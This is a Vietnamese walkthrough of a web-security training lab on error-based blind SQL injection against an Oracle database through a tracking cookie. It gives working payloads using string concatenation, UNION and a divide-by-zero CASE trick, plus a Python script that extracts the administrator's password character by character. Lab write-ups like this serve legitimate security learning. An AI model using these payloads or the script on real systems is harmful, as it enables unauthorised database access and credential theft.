![image](https://github.com/user-attachments/assets/cc16552d-8149-42d8-b223-26335cc24fe9)

Sau khi test với nháy đơn thì xác định được ứng dụng bị sqli.

![image](https://github.com/user-attachments/assets/276c23ac-c98d-41f9-9684-2fb3b904894c)

Thử câu truy vấn hợp lệ nhưng không có tác dụng thực tế và nó vẫn báo lỗi, tức là khả năng bị sai, có thể là thiếu table.

Thử xem, ví dụ như dbms mssql, sql server xem, select schema table chẳng hạn. Nhưng cho nhanh thì tôi sẽ thử các cái nổi nổi như mysql, oracle nhất.

![image](https://github.com/user-attachments/assets/a14a1663-c0b3-477c-a2cc-4a84e570ed0d)

Đúng thật sau khi thử thì ta biết chắc chắn sqli này là oracle.

Nhưng tại sao phải dùng `||` nhỉ ?? Liệu có thể dùng cái khác không ???. Thì câu trả lời sẽ là có thể. dùng || để như trong trường hợp waf nó chặn union chẳng hạn. Và `||` trong trường hợp này là nó dùng để nối chuỗi mà thì cũng tương đương với mực đích dùng union thôi.

Tiến hành dùng union xem sao nhé.

![image](https://github.com/user-attachments/assets/581ccd39-a4a3-4388-844c-f21c5da5d196)

Đó đã thành công rồi kìa.

2 Payload tương đương

```
'||(SELECT+''+from+dual)||'
'union+select+''+from+dual--
```

![image](https://github.com/user-attachments/assets/6d89c50a-1e7e-409f-964f-0b130eef7373)

Chứng tỏ sqli đã được thực thi.

Tiếp theo chúng ta sẽ đoán tên column và khai thác sqli này là Error-Based SQL Injection

Và tôi sẽ dùng cách này để tấn công, theo đúng format của oracle nhé

```
CASE WHEN ... THEN ... ELSE ... END.
```

![image](https://github.com/user-attachments/assets/1be24ad2-7462-4866-b6bb-29161b76239e)

Đi từ đầu câu truy vấn nhé, bạn có thể thấy rằng case nó như switch case trong c++ hay các ngôn ngữ lập trình khác á.

Thì nó gặp 1=1 tức là đúng thì nó sẽ đến then và nó gặp 1/0, thì lại sai vì không thể chia cho 0. Khi đó nó sẽ bắn ra lỗi.

![image](https://github.com/user-attachments/assets/6752d0a1-f8e8-4b54-8428-6c5aa34e9d13)

Còn khi mà 1=2 thì nó sẽ nhảy đến else luôn.

Đó thì ta lợi dụng cách này để đoán ra tên column. 

**Và lưu ý nhé, nếu không có dữ liệu để chạy CASE, thì CASE không chạy luôn.**

Thì đó mới là nguyên nhân ta biết đoán được dựa trên error nhé, chứ không phải là case -> then luôn đâu, nó sẽ check xem column đó có tồn tại hay k đấy.

![image](https://github.com/user-attachments/assets/5e88fa01-a3c9-442e-b931-53c5e6949a41)

![image](https://github.com/user-attachments/assets/58cca1fa-1930-4f5b-ab3b-391f2551e558)

Vậy là ta đã check được passwd có 20 ký tự nhé.

![image](https://github.com/user-attachments/assets/36682a9b-ba5c-4697-b7de-36885c3068ae)

Payload:

```
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Cách thứ 2 là tôi sẽ viết script

```
import requests
import string

# Cấu hình request
URL = "https://0a1e004903ddf4658108ed5b007e00bb.web-security-academy.net/filter?category=Gifts"
COOKIES = {
    "session": "FX2cnYUNTlQ3tFoLzudHsZC57WVSbHMc"
}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
    "Referer": "https://0a1e004903ddf4658108ed5b007e00bb.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document"
}

# Bộ ký tự cần thử: a-z, A-Z, 0-9
CHARSET = string.ascii_letters + string.digits


def is_correct_guess(response):
    """ Kiểm tra nếu server trả về lỗi 500 (chia cho 0). """
    return response.status_code == 500


def brute_force_password():
    password = ""

    for i in range(1, 50):  # Giả sử password có tối đa 50 ký tự
        found = False
        for char in CHARSET:
            # Inject SQL để kiểm tra ký tự thứ i của password
            payload = f"jjb6UlCHrlZ1SHBB'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            cookies = COOKIES.copy()
            cookies["TrackingId"] = payload

            print(f"[*] Đang thử ký tự thứ {i}: {char}")  # Debug

            response = requests.get(URL, cookies=cookies, headers=HEADERS)

            if is_correct_guess(response):
                password += char
                print(f"[+] Ký tự đúng: {char} --> {password}")
                found = True
                break
        
        if not found:
            print(f"[*] Password hoàn chỉnh: {password}")
            break

    return password


# Chạy script
final_password = brute_force_password()
print(f"Password cuối cùng: {final_password}")

```

![image](https://github.com/user-attachments/assets/beaa9312-b17a-43fb-b537-bb705702b78e)

Vậy là đã thành công.

![image](https://github.com/user-attachments/assets/b1c2cb10-453b-4386-9a3a-a830b8376038)
